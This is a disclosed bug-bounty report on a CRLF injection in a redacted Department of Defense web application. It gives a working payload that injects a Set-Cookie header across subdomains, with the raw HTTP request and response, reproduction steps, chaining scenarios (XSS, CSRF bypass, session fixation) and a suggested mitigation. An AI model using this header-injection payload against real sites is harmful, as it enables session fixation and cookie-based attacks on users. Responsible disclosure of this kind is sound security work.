# CRLF Injection on ███████

## Report Details
- **Report ID**: 245485
- **URL**: https://hackerone.com/reports/245485
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-03T09:53:59.590Z
- **Disclosed**: 2019-12-02T19:01:30.276Z

## Reporter
- **Username**: twicedi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
The web application hosted on the "█████" domain is affected by a carriage return line feeds (CRLF) injection vulnerability that could be used in combination with others. This issue could allow XSS via Cookie, bypass Double Submit Cookie csrf protection or Session Fixation on .█████████ domains web apps.

**Description:**
A CRLF Injection attack occurs when an attacker manages to submit a CRLF into an application. 
These two special characters represent the End of Line (EOL) marker for many internet protocols, including HTTP. Web applications typically split headers based on where the CRLF character sequence is found. Therefore, if a malicious user is able to inject their own CRLF sequence into an HTTP stream, they gain control over the contents of the HTTP response.
In this case this is could be done by modifying an HTTP request directed to the "███" adding, for example, the following payload:

> %0D%0ASet-Cookie:test2=test;domain=.████

With the preceding payload, an attacker is going to set, on the victim's browser that is visiting the malicious URL, a new cookie with an arbitrary value. Note that the scope of this cookie include all ".█████" subdomains, so this cookie is going to be sent, by the browser, to all the subdomains.

URL: http://████/advanced%0D%0ASet-Cookie:test2=test;domain=.█████

Generated request:
```
GET /advanced%0D%0ASet-Cookie:test2=test;domain=.████ HTTP/1.1
Host: ██████████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Upgrade-Insecure-Requests: 1
```

Response (note the "Set-Cookie" header):
```
HTTP/1.1 302 Found
Date: Mon, 03 Jul 2017 08:55:53 GMT
Server: Apache
Location: http://www.█████████:80/advanced
Content-Length: 267
Content-Type: text/html; charset=iso-8859-1
my_cache-control: no-cache
my_pragma: no-cache
Connection: close
Set-Cookie: test2=test;domain=.█████████

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="http://www.███:80/advanced
Set-Cookie:test2=test;domain=.█████████">here</a>.</p>
</body></html>
```

At this poin the new cookie is set on the browser, and it is going to be sent in every request, as showed in the following examples.

Request to the same subdomain ( http://www.███████/advanced ):
```
GET /advanced HTTP/1.1
Host: www.██████████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=F48C86E41595456012C5228F2A807BCC; test2=test
Connection: close
```

Request to another █████████ subdomain ( http://www.█████ ):
```
GET / HTTP/1.1
Host: www.█████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: test2=test
Connection: close
Upgrade-Insecure-Requests: 1
```

## Impact
This vulnerability could be chained with other issues allowing for example:
1) XSS via Cookie: for example in case in which the value of the cookie is reflected somewhere without output encoding
2) bypass Double Submit Cookie CSRF protection: in case in which an application use this solution as CSRF protection
3) Session Fixation: if an application is not renewing the session cookie (for example JSESSIONID) after the login.
Note that, in the preceding example, it is showed how an attacker could set an arbirtary cookie valid for all the .███████ subdomains so, after the cookie is set, the exploitation could be carried on other subdomains.

## Step-by-step Reproduction Instructions

1. Open the following URL with Firefox: http://██████/advanced%0D%0ASet-Cookie:test2=test;domain=.██████████
2. A new cookie is going to be set
3. This cookie is going to be sent on all the .█████████ subdomains

## Product, Version, and Configuration (If applicable)
The exploitability of the issue has been tested with the latest version (at the time of writing) of the following browsers:

> Firefox (v54.0)
> Microsoft Edge

## Suggested Mitigation/Remediation Actions
To mitigate this issue, the application should strip out any input which contains the **%0D%0A** URL encoded characters.

I'm available for further clarification,

Best,
Davide

## Attachments
No attachments
